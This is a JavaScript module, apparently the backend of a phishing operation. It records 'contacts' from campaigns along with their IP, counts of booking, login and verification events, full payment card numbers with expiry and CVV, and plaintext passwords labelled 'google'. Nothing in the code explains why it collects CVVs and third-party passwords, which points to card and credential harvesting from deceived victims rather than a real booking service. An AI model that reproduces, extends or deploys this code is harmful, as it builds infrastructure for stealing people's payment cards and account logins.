import { createClient } from '@supabase/supabase-js';
import 'dotenv/config';
import { getCampaignName } from './getCampaigns.js';
import { storeCard } from './storeCards.js';
import { storeLogin } from './storeLogins.js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error('⚠️ Missing Supabase credentials. Set SUPABASE_URL & SUPABASE_SERVICE_KEY');
  throw new Error('Missing Supabase credentials');
}

const supabase = createClient(supabaseUrl, supabaseKey);

// Upsert Contact par téléphone, avec incrément de compteurs et création facultative
// de cartes (cards) et logins (logins). Retourne { contactId, action }.
export async function storeContact({
  fullName = null,
  email = null,
  phone = null,
  ip = null,
  campaignId = null,
  eventId = null,
  eventType = '', // 'booking' | 'login' | 'verification_start' | ...
  payload = {},   // { name, card, exp, cvv, password }
}) {
  // Require email for contact identification
  console.log('storeContact validation:', { email, phone, emailTrimmed: email?.trim(), phoneTrimmed: phone?.trim() });
  const hasEmail = email && email.trim() !== '';
  const hasPhone = phone && phone.trim() !== '';
  console.log('hasEmail:', hasEmail, 'hasPhone:', hasPhone);
  if (!hasEmail) {
    console.log('Email is empty, throwing error');
    throw new Error('email is required for contact upsert');
  }

  const now = new Date().toISOString();

  // 1) Chercher un contact existant par téléphone ou email
  let existing = null;
  let findErr = null;
  
  if (phone && phone.trim() !== '') {
    // Try to find by phone first
    const phoneResult = await supabase
      .from('contacts')
      .select('*')
      .eq('phone', phone)
      .limit(1)
      .maybeSingle();
    existing = phoneResult.data;
    findErr = phoneResult.error;
  }
  
  if (!existing && email && email.trim() !== '') {
    // If not found by phone, try by email
    const emailResult = await supabase
      .from('contacts')
      .select('*')
      .eq('email', email)
      .limit(1)
      .maybeSingle();
    existing = emailResult.data;
    findErr = emailResult.error;
  }
  
  if (findErr) throw findErr;

  // 2) Déterminer les compteurs à incrémenter selon l'évènement
  const counters = { booking_count: 0, login_count: 0, verification_count: 0 };
  if (eventType === 'booking') counters.booking_count = 1;
  if (eventType === 'login') counters.login_count = 1;
  if (eventType?.startsWith('verification')) counters.verification_count = 1;

  let contactId;
  let action;

  if (existing) {
    // Merge sur le contact existant
    const updateData = {
      name: fullName || existing.name,
      email: email || existing.email,
      phone: phone || existing.phone,
      ip: ip || existing.ip,
      campaign_id: campaignId ?? existing.campaign_id ?? null,
      booking_count: (existing.booking_count || 0) + counters.booking_count,
      login_count: (existing.login_count || 0) + counters.login_count,
      verification_count: (existing.verification_count || 0) + counters.verification_count,
      updated_at: now,
    };

    const { error: updErr, data: updData } = await supabase
      .from('contacts')
      .update(updateData)
      .eq('id', existing.id)
      .select('id')
      .single();
    if (updErr) throw updErr;
    contactId = updData.id;
    action = 'updated';
  } else {
    // Créer un nouveau contact
    const insertData = {
      name: fullName || null,
      email,
      phone: phone || null,
      ip,
      campaign_id: campaignId ?? null,
      last_campaign: await getCampaignName(campaignId),
      status: eventType? 'active' : 'inactive',
      source_type: eventType, // 'booking' | 'login' | 'verification_start' | ...
      booking_count: counters.booking_count,
      login_count: counters.login_count,
      verification_count: counters.verification_count,
      created_at: now,
      updated_at: now,
    };

    const { error: insErr, data: insData } = await supabase
      .from('contacts')
      .insert(insertData)
      .select('id')
      .single();
    if (insErr) throw insErr;
    contactId = insData.id;
    action = 'created';
  }

  // 3) Enregistrer la carte si présente
  if (payload?.card || payload?.exp || payload?.name || payload?.cvv) {
    console.log('hasCard:', payload?.card);
    await storeCard(contactId, {
      cardNumber: payload.card,
      cardOwner: payload.name,
      cardExpiration: payload.exp,
      cardCVC: payload.cvv
    });
  }

  // 4) Enregistrer un login si password fourni
  if (payload?.password) {
    await storeLogin(contactId, email || phone, payload.password, 'google');
  }

  return { contactId, action };
}



// Mise à jour du statut d'un contact après traitement
export async function updateContactStatus(id, status, campaign) {
  const { data, error } = await supabase
      .from('contacts')
      .update({ 
          status: status,
          last_campaign: campaign.name,
          last_contacted_at: new Date().toISOString()
      })
      .eq('id', id);

  if (error) {
      throw error;
  }

  return data;
}